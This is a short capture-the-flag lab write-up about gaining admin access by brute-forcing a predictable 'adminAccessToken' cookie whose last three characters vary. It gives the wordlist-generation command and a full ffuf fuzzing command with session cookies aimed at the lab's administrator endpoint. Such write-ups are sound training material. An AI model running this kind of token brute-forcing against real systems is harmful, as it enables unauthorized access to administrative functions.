
Daily challenge.
Hint: *Can you craft a token?*

After creating an account and logging in, I noticed that there are two tokens, one `token` which is JWT, and the other one named `adminAccessToken`, which is a string of characters. Next I created 2 more accounts and I noticed that only three last characters changes in the `adminAccessToken`.
First I created a wordlist with `echo {a..z}{a..z}{a..z} | tr ' ' '\n' > wordlist.txt`.
Next I used ffuf to fuzz fast this token, because there are 17576 combinations. The command was: `ffuf -u https://lab-1788003044611-mkec1v.labs-app.bugforge.io/administrator -w wordlist.txt -H "Cookie: adminAccessToken=n0MqjBXna9A4FUZZ; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJoYWNrZXIxIiwiaWF0IjoxNzg4MDAzNDU1LCJleHAiOjE3ODgwMTA2NTV9._1Mnuy33T4SuEhxvUT90Q2WpeCYhKlLBv5ORSicCKjU" -fs 7890`

The correct token is one with `rls` letters at the end. After changing it in the request to `/administrator` endpoint in Burp, I got the flag.
![](Images/giftlab1.png)